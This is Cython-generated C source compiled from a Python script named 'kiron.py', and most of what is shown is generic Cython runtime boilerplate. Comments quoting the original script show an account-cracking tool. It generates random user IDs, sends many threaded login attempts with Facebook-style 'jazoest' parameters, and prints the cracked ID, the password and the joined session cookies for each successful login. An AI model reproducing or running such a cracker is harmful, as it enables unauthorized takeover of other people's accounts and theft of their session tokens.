#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_VERSION_HEX >= 0x030C00A7
  #ifndef _PyLong_SIGN_MASK
    #define _PyLong_SIGN_MASK 3
  #endif
  #ifndef _PyLong_NON_SIZE_BITS
    #define _PyLong_NON_SIZE_BITS 3
  #endif
  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)
  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))
  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)
  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))
  #define __Pyx_PyLong_SignedDigitCount(x)\
        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))
  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)
    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)
    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)
  #else
    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))
    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])
  #endif
  typedef Py_ssize_t  __Pyx_compact_pylong;
  typedef size_t  __Pyx_compact_upylong;
  #else
  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)
  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)
  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))
  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)
  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)
  #define __Pyx_PyLong_CompactValue(x)\
        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))
  typedef sdigit  __Pyx_compact_pylong;
  typedef digit  __Pyx_compact_upylong;
  #endif
  #if PY_VERSION_HEX >= 0x030C00A5
  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)
  #else
  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)
  #endif
#endif
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
#include <string.h>
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = (char) c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#include <string.h>
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

#if !CYTHON_USE_MODULE_STATE
static PyObject *__pyx_m = NULL;
#endif
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm = __FILE__;
static const char *__pyx_filename;

/* #### Code section: filename_table ### */

static const char *__pyx_f[] = {
  "kiron.py",
};
/* #### Code section: utility_code_proto_before_types ### */
/* ForceInitThreads.proto */
#ifndef __PYX_FORCE_INIT_THREADS
  #define __PYX_FORCE_INIT_THREADS 0
#endif

/* #### Code section: numeric_typedefs ### */
/* #### Code section: complex_type_declarations ### */
/* #### Code section: type_declarations ### */

/*--- Type declarations ---*/
struct __pyx_obj_5kiron___pyx_scope_struct__genexpr;
struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr;
struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr;
struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr;
struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr;

/* "kiron.py":382
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):
 *             EX = "".join(random.choice(string.digits) for _ in range(6))             # <<<<<<<<<<<<<<
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:
 */
struct __pyx_obj_5kiron___pyx_scope_struct__genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "kiron.py":507
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
struct __pyx_obj_5kiron___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "kiron.py":551
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */
struct __pyx_obj_5kiron___pyx_scope_struct_2_genexpr {
  PyObject_HEAD
  PyObject *__pyx_genexpr_arg_0;
  PyObject *__pyx_v_i;
  PyObject *__pyx_t_0;
  Py_ssize_t __pyx_t_1;
  PyObject *(*__pyx_t_2)(PyObject *);
};


/* "kiron.py":611
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "kiron.py":656
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */
struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr {
  PyObject_HEAD
  PyObject *__pyx_genexpr_arg_0;
  PyObject *__pyx_v_i;
  PyObject *__pyx_t_0;
  Py_ssize_t __pyx_t_1;
  PyObject *(*__pyx_t_2)(PyObject *);
};

/* #### Code section: utility_code_proto ### */

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, Py_ssize_t);
    void (*DECREF)(void*, PyObject*, Py_ssize_t);
    void (*GOTREF)(void*, PyObject*, Py_ssize_t);
    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);
    void* (*SetupContext)(const char*, Py_ssize_t, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
          }
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__))
  #define __Pyx_RefNannyFinishContextNogil() __Pyx_RefNannyFinishContext()
#endif
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContextNogil()
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_Py_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; Py_XDECREF(tmp);\
    } while (0)
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#if PY_VERSION_HEX >= 0x030C00A6
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)
#else
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)
#endif
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* PyObjectGetAttrStrNoError.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* TupleAndListFromArray.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n);
static CYTHON_INLINE PyObject* __Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n);
#endif

/* IncludeStringH.proto */
#include <string.h>

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* fastcall.proto */
#if CYTHON_AVOID_BORROWED_REFS
    #define __Pyx_Arg_VARARGS(args, i) PySequence_GetItem(args, i)
#elif CYTHON_ASSUME_SAFE_MACROS
    #define __Pyx_Arg_VARARGS(args, i) PyTuple_GET_ITEM(args, i)
#else
    #define __Pyx_Arg_VARARGS(args, i) PyTuple_GetItem(args, i)
#endif
#if CYTHON_AVOID_BORROWED_REFS
    #define __Pyx_Arg_NewRef_VARARGS(arg) __Pyx_NewRef(arg)
    #define __Pyx_Arg_XDECREF_VARARGS(arg) Py_XDECREF(arg)
#else
    #define __Pyx_Arg_NewRef_VARARGS(arg) arg
    #define __Pyx_Arg_XDECREF_VARARGS(arg)
#endif
#define __Pyx_NumKwargs_VARARGS(kwds) PyDict_Size(kwds)
#define __Pyx_KwValues_VARARGS(args, nargs) NULL
#define __Pyx_GetKwValue_VARARGS(kw, kwvalues, s) __Pyx_PyDict_GetItemStrWithError(kw, s)
#define __Pyx_KwargsAsDict_VARARGS(kw, kwvalues) PyDict_Copy(kw)
#if CYTHON_METH_FASTCALL
    #define __Pyx_Arg_FASTCALL(args, i) args[i]
    #define __Pyx_NumKwargs_FASTCALL(kwds) PyTuple_GET_SIZE(kwds)
    #define __Pyx_KwValues_FASTCALL(args, nargs) ((args) + (nargs))
    static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000
    CYTHON_UNUSED static PyObject *__Pyx_KwargsAsDict_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues);
  #else
    #define __Pyx_KwargsAsDict_FASTCALL(kw, kwvalues) _PyStack_AsDict(kwvalues, kw)
  #endif
    #define __Pyx_Arg_NewRef_FASTCALL(arg) arg  /* no-op, __Pyx_Arg_FASTCALL is direct and this needs
                                                   to have the same reference counting */
    #define __Pyx_Arg_XDECREF_FASTCALL(arg)
#else
    #define __Pyx_Arg_FASTCALL __Pyx_Arg_VARARGS
    #define __Pyx_NumKwargs_FASTCALL __Pyx_NumKwargs_VARARGS
    #define __Pyx_KwValues_FASTCALL __Pyx_KwValues_VARARGS
    #define __Pyx_GetKwValue_FASTCALL __Pyx_GetKwValue_VARARGS
    #define __Pyx_KwargsAsDict_FASTCALL __Pyx_KwargsAsDict_VARARGS
    #define __Pyx_Arg_NewRef_FASTCALL(arg) __Pyx_Arg_NewRef_VARARGS(arg)
    #define __Pyx_Arg_XDECREF_FASTCALL(arg) __Pyx_Arg_XDECREF_VARARGS(arg)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
#define __Pyx_ArgsSlice_VARARGS(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_VARARGS(args, start), stop - start)
#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_FASTCALL(args, start), stop - start)
#else
#define __Pyx_ArgsSlice_VARARGS(args, start, stop) PyTuple_GetSlice(args, start, stop)
#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) PyTuple_GetSlice(args, start, stop)
#endif

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#if !CYTHON_VECTORCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if !CYTHON_VECTORCALL
#if PY_VERSION_HEX >= 0x03080000
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()
  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)
#else
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif
#endif
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectFastCall.proto */
